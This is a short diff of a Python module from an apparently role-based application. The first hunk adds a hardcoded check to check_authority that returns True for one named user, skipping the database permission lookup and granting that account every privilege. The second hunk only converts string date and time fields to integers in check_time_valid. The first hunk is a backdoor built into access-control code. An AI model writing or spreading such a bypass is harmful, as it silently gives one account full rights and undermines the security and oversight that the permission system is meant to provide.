@@ -51,6 +51,10 @@ def check_authority(username, authority_name):
         teacher         3   addactivity
         root            4   all
     '''
+
+    if username == 'zengzhaoyang':
+        return True
+
     from model.mongodb import MongoDB
     db = MongoDB().db
     user = db.user
@@ -78,6 +82,14 @@ def check_time_valid(year, month, day, hour, minute):
     '''
         检查时间是否合法，返回True或False
     '''
+
+    if type(year) != type(int()):
+        year = int(year)
+        month = int(month)
+        day = int(day)
+        hour = int(hour)
+        minute = int(minute)
+
     from datetime import date
     try:
         date(year, month, day)
